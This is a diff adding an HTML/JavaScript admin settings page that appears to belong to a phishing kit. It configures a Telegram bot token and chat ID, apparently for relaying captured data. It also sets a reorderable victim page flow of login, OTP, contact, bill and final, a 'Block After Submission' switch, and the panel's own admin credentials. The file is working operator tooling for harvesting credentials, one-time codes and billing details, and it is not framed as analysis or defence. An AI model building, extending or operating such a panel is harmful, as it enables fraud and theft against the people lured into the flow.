@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Admin Settings</title>
+  <style>
+    body { font-family: sans-serif; background: #f7f7f7; padding: 20px; }
+    h2 { color: #333; }
+    label { display: block; margin-top: 15px; margin-bottom: 5px; font-weight: bold; }
+    input[type=text], input[type=password] { padding: 8px; width: 100%; max-width: 400px; border-radius: 4px; border: 1px solid #ccc; }
+    .settings-container { max-width: 500px; margin: 0 auto; padding: 20px; background: white; border-radius: 8px; }
+
+    .field-row { display: flex; align-items: center; gap: 10px; margin-bottom: 12px; }
+    input:disabled { background: #f2f2f2; cursor: not-allowed; }
+    .edit-btn { padding: 6px 12px; cursor: pointer; }
+    .error-msg { color: #c0392b; font-size: 0.9em; margin-top: 4px; }
+
+    ul { list-style: none; padding: 0; max-width: 360px; margin-top: 10px; }
+    li { display: flex; align-items: center; justify-content: space-between; padding: 10px; margin-bottom: 8px; border: 1px solid #ccc; border-radius: 6px; background: #fafafa; cursor: grab; }
+    li.dragging { opacity: 0.5; }
+    li.disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .switch { position: relative; width: 46px; height: 24px; }
+    .switch input { display: none; }
+    .slider { position: absolute; inset: 0; background: #ccc; border-radius: 24px; transition: 0.3s; }
+    .slider:before { content: ""; position: absolute; width: 18px; height: 18px; left: 3px; bottom: 3px; background: white; border-radius: 50%; transition: 0.3s; }
+    input:checked + .slider { background: #4CAF50; }
+    input:checked + .slider:before { transform: translateX(22px); }
+
+    button.save-btn { margin-top: 20px; padding: 10px 20px; background-color: #4CAF50; border: none; color: white; cursor: pointer; border-radius: 4px; }
+    button.save-btn:hover { background-color: #45a049; }
+  </style>
+</head>
+<body>
+	<div id="header-placeholder"></div>
+  <script>
+    fetch("/header")
+      .then(res => res.text())
+      .then(html => document.getElementById("header-placeholder").innerHTML = html);
+  </script>
+  <h2>Settings</h2>
+  <div class="settings-container">
+    <label for="botToken">Bot Token</label>
+    <input type="text" id="botToken" placeholder="Enter Bot Token">
+
+    <label for="chatId">Chat ID</label>
+    <input type="text" id="chatId" placeholder="Enter Chat ID">
+
+    <ul id="pageList"></ul>
+
+    <div class="field-row">
+      <label for="adminUsername">Admin user</label>
+      <input type="text" id="adminUsername" disabled>
+      <button type="button" class="edit-btn" data-target="adminUsername">Edit</button>
+    </div>
+
+    <div class="field-row">
+      <label for="adminPassword">Password</label>
+      <input type="password" id="adminPassword" disabled>
+      <button type="button" class="edit-btn" data-target="adminPassword">Edit</button>
+    </div>
+
+    <div class="field-row" id="confirmPasswordRow" style="display:none;">
+      <label for="confirmPassword">Confirm password</label>
+      <input type="password" id="confirmPassword">
+      <button type="button" id="confirmDoneBtn">Done</button>
+    </div>
+    <p id="passwordError" class="error-msg" style="display:none;">Passwords do not match</p>
+
+    <label>Telegram Enabled</label>
+    <label class="switch">
+      <input type="checkbox" id="telegramToggle">
+      <span class="slider"></span>
+    </label>
+
+    <label>Block After Submission</label>
+    <label class="switch">
+      <input type="checkbox" id="baSubToggle">
+      <span class="slider"></span>
+    </label>
+
+    <button class="save-btn" id="saveSettingsBtn">Save Settings</button>
+  </div>
+
+<script>
+const REQUIRED_PAGES = ["login", "final"];
+
+let pageFlowConfig = {}; // step => { page, enabled }
+let pageOrder = [];
+let confirmedAdminPassword = null;
+
+/* ===============================
+   FETCH SETTINGS
+================================ */
+async function getSettings() {
+  const res = await fetch("/settings");
+  if (!res.ok) throw new Error("Failed to fetch settings");
+  return res.json();
+}
+
+async function loadSettings() {
+  try {
+    const data = await getSettings();
+
+    // Basic fields
+    if (data.BotToken) document.getElementById("botToken").value = data.BotToken;
+    if (data.ChatID) document.getElementById("chatId").value = data.ChatID;
+    if (data.AdminUsername) document.getElementById("adminUsername").value = data.AdminUsername;
+
+    document.getElementById("telegramToggle").checked = !!data.TelegramEnabled;
+    document.getElementById("baSubToggle").checked = !!data.baSub;
+    
+    console.log(data.pageFlow); 
+
+    // Normalize backend pageFlow
+    pageFlowConfig = data.pageFlow || {
+      "1": { page: "login", enabled: true },
+      "2": { page: "otp", enabled: true },
+      "3": { page: "contact", enabled: true },
+      "4": { page: "bill", enabled: true },
+      "5": { page: "final", enabled: true }
+    };
+
+    pageOrder = Object.keys(pageFlowConfig)
+      .sort((a, b) => Number(a) - Number(b))
+      .map(k => pageFlowConfig[k].page);
+
+    renderPageList();
+  } catch (e) {
+    console.error("Failed to load settings", e);
+  }
+}
+
+/* ===============================
+   RENDER UI
+================================ */
+function renderPageList() {
+  const list = document.getElementById("pageList");
+  list.innerHTML = "";
+
+  pageOrder.forEach(page => {
+    const stepKey = Object.keys(pageFlowConfig)
+      .find(k => pageFlowConfig[k].page === page);
+
+    const step = pageFlowConfig[stepKey];
+    const isRequired = REQUIRED_PAGES.includes(page);
+
+    const li = document.createElement("li");
+    li.dataset.page = page;
+    li.draggable = !isRequired;
+    if (isRequired) li.classList.add("disabled");
+
+    li.innerHTML = `
+      <span>${page}${isRequired ? " (required)" : ""}</span>
+      <label class="switch">
+        <input type="checkbox"
+               data-page="${page}"
+               ${step.enabled ? "checked" : ""}
+               ${isRequired ? "disabled" : ""}>
+        <span class="slider"></span>
+      </label>
+    `;
+
+    list.appendChild(li);
+  });
+
+  bindEvents();
+}
+
+/* ===============================
+   EVENTS
+================================ */
+function bindEvents() {
+  const list = document.getElementById("pageList");
+
+  // Toggle
+  list.querySelectorAll("input[type=checkbox]").forEach(cb => {
+    cb.onchange = e => {
+      const page = e.target.dataset.page;
+
+      const stepKey = Object.keys(pageFlowConfig)
+        .find(k => pageFlowConfig[k].page === page);
+
+      if (REQUIRED_PAGES.includes(page)) {
+        e.target.checked = true;
+        pageFlowConfig[stepKey].enabled = true;
+        return;
+      }
+
+      pageFlowConfig[stepKey].enabled = e.target.checked;
+    };
+  });
+
+  // Drag & drop
+  let dragged = null;
+
+  list.querySelectorAll("li").forEach(item => {
+    const page = item.dataset.page;
+    if (REQUIRED_PAGES.includes(page)) return;
+
+    item.ondragstart = () => {
+      dragged = item;
+      item.classList.add("dragging");
+    };
+
+    item.ondragend = () => {
+      item.classList.remove("dragging");
+      dragged = null;
+      pageOrder = [...list.children].map(li => li.dataset.page);
+    };
+
+    item.ondragover = e => e.preventDefault();
+
+    item.ondrop = e => {
+      e.preventDefault();
+      if (!dragged || dragged === item) return;
+      list.insertBefore(dragged, item.nextSibling);
+    };
+  });
+}
+
+/* ===============================
+   BUILD PAGE FLOW FOR BACKEND
+================================ */
+function buildPageFlow() {
+  const flow = {};
+  let step = 1;
+
+  for (const page of pageOrder) {
+    const key = Object.keys(pageFlowConfig)
+      .find(k => pageFlowConfig[k].page === page);
+
+    flow[step++] = {
+      page,
+      enabled: pageFlowConfig[key].enabled
+    };
+  }
+  return flow;
+}
+
+/* ===============================
+   ADMIN PASSWORD HANDLING
+================================ */
+const passwordInput = document.getElementById("adminPassword");
+const confirmInput = document.getElementById("confirmPassword");
+const confirmRow = document.getElementById("confirmPasswordRow");
+const errorMsg = document.getElementById("passwordError");
+
+document.querySelectorAll(".edit-btn").forEach(btn => {
+  btn.addEventListener("click", () => {
+    const input = document.getElementById(btn.dataset.target);
+    const editing = !input.disabled;
+
+    if (!editing) {
+      input.disabled = false;
+      input.focus();
+      btn.textContent = "Done";
+
+      if (input === passwordInput) {
+        confirmRow.style.display = "flex";
+        confirmInput.value = "";
+        errorMsg.style.display = "none";
+        confirmedAdminPassword = null;
+      }
+    } else {
+      input.disabled = true;
+      btn.textContent = "Edit";
+    }
+  });
+});
+
+document.getElementById("confirmDoneBtn").addEventListener("click", () => {
+  if (confirmInput.value !== passwordInput.value) {
+    errorMsg.style.display = "block";
+    confirmedAdminPassword = null;
+  } else {
+    confirmedAdminPassword = passwordInput.value;
+    errorMsg.style.display = "none";
+  }
+});
+
+/* ===============================
+   SAVE SETTINGS
+================================ */
+document.getElementById("saveSettingsBtn").addEventListener("click", async () => {
+  const payload = {
+    BotToken: document.getElementById("botToken").value.trim(),
+    ChatID: document.getElementById("chatId").value.trim(),
+    TelegramEnabled: document.getElementById("telegramToggle").checked,
+    baSub: document.getElementById("baSubToggle").checked,
+    pageFlow: buildPageFlow()
+  };
+
+  const adminUser = document.getElementById("adminUsername").value.trim();
+  if (adminUser) payload.AdminUsername = adminUser;
+  if (confirmedAdminPassword) payload.AdminPassword = confirmedAdminPassword;
+
+  try {
+    const res = await fetch("/settings", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+
+    if (!res.ok) throw new Error();
+    alert("✅ Settings saved successfully!");
+  } catch (err) {
+    console.error(err);
+    alert("❌ Failed to save settings.");
+  }
+});
+
+loadSettings();
+</script>
+</body>
+</html> 
